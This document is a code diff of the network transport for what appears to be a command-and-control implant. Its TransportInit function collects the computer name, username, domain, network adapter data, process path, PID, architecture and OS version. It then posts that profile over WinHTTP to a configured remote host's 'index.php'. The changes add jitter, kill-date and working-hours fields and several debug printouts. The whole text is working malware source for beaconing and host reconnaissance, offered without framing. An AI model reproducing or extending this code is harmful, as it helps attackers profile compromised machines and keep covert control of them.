@@ -53,27 +53,30 @@ BOOL TransportInit( )
     PackageAddInt32( Package, Instance.Session.AgentID );
 
     // Get Computer name
-    if ( ! GetComputerNameExA( ComputerNameNetBIOS, NULL, (LPDWORD) &Length ) )
-    {
-        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA( ComputerNameNetBIOS, Data, (LPDWORD) &Length );
+    if ( ! GetComputerNameExA( ComputerNameNetBIOS, NULL, (LPDWORD) &Length ) ) {
+        if ((Data = LocalAlloc(LPTR, Length))) {
+            GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
+
+        }
     }
+
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
 
     // Get Username
     Length = MAX_PATH;
-    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
+    if ( ( Data = LocalAlloc( LPTR, Length ) ) ){
         GetUserNameA( Data, (LPDWORD) &Length );
+    }
 
     PackageAddBytes( Package, Data, strlen( Data ) );
     DATA_FREE( Data, Length );
 
     // Get Domain
-    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, (LPDWORD) &Length ) )
-    {
-        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA( ComputerNameDnsDomain, Data, (LPDWORD) &Length );
+    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, (LPDWORD) &Length ) ) {
+        if ((Data = LocalAlloc(LPTR, Length))) {
+            GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
+        }
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -89,11 +92,13 @@ BOOL TransportInit( )
             LocalFree( Adapter );
             Adapter = NULL;
         }
-        else
-            PackageAddInt32( Package, 0 );
+
+        else {
+            PackageAddInt32(Package, 0);
+        }
+    } else {
+        PackageAddInt32(Package, 0);
     }
-    else
-        PackageAddInt32( Package, 0 );
 
 
     Length = MAX_PATH;
@@ -101,11 +106,11 @@ BOOL TransportInit( )
     {
         Length = GetModuleFileNameA( NULL, Data, Length );
         PackageAddBytes( Package, Data, Length );
-    } else PackageAddInt32( Package, 0 );
+    } else { PackageAddInt32( Package, 0 ); }
 
     PackageAddInt32( Package, GetCurrentProcessId() );
-    PackageAddInt32( Package, 0 );
-    PackageAddInt32( Package, PROCESS_AGENT_ARCH );
+    PackageAddInt32( Package, (DWORD) 0 );
+    PackageAddInt32( Package, Instance.Session.ProcArch );
     PackageAddInt32( Package, FALSE ); // default
 
     memset( &OsVersions, 0, sizeof( OsVersions ) );
@@ -120,10 +125,16 @@ BOOL TransportInit( )
 
     PackageAddInt32( Package, Instance.Session.OSArch );
     PackageAddInt32( Package, Instance.Config.Sleeping );
+    PackageAddInt32( Package, Instance.Config.Jitter );
+    PackageAddInt32( Package, Instance.Config.Transport.KillDate );
+    PackageAddInt32( Package, Instance.Config.Transport.WorkingHours );
     // End of Options
+
+    PRINT_HEX( Data, Length )
 
     if ( PackageTransmit( Package, &Data, &Length ) )
     {
+        printf("TRANSMITTED PACKAGE!\n");
         PRINT_HEX( Data, Length )
 
         if ( Data )
@@ -131,6 +142,7 @@ BOOL TransportInit( )
             printf( "Agent => %x : %x\n", ( UINT32 ) DEREF( Data ), ( UINT32 ) Instance.Session.AgentID );
             if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
             {
+                printf("CONNECTED!\n");
                 Instance.Session.Connected = TRUE;
                 Success = TRUE;
             }
@@ -157,7 +169,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     UCHAR   Buffer[ 1024 ]  = { 0 };
     PVOID   RespBuffer      = NULL;
     SIZE_T  RespSize        = 0;
-    BOOL    Successful      = TRUE;
+    BOOL    Successful      = FALSE;
 
     hSession = WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
     if ( ! hSession )
@@ -168,6 +180,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     }
 
     hConnect = WinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
+    printf( "> WinHttpConnect=> %d\n", GetLastError() );
     if ( ! hConnect )
     {
         printf( "WinHttpConnect: Failed => %d\n", GetLastError() );
@@ -178,10 +191,13 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     HttpEndpoint = L"index.php";
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
-    if ( Instance.Config.Transport.Secure )
+    if ( Instance.Config.Transport.Secure ){
         HttpFlags |= WINHTTP_FLAG_SECURE;
+    }
 
     hRequest = WinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
+    printf( "> WinHttpOpenRequest=> %d\n", GetLastError() );
+
     if ( ! hRequest )
     {
         printf( "WinHttpOpenRequest: Failed => %d\n", GetLastError() );
@@ -198,10 +214,15 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         if ( ! WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
         {
             printf( "WinHttpSetOption: Failed => %d\n", GetLastError() );
+        }else{
+            printf( "> WinHttpSetOption => %d\n", GetLastError() );
+
         }
     }
 
     // Send our data
+    // PRINT_HEX(Data, Size)
+
     if ( WinHttpSendRequest( hRequest, NULL, 0, Data, Size, Size, 0x0 ) )
     {
         if ( RecvData && WinHttpReceiveResponse( hRequest, NULL ) )
@@ -240,11 +261,11 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     }
     else
     {
-        if ( GetLastError() == 12029 ) // ERROR_INTERNET_CANNOT_CONNECT
+        if ( GetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
             Instance.Session.Connected = FALSE;
-        else
-            printf( "WinHttpSendRequest: Failed => %d\n", GetLastError() );
-
+        }else {
+            printf("WinHttpSendRequest: Failed => %d\n", GetLastError());
+        }
         Successful = FALSE;
         goto LEAVE;
     }
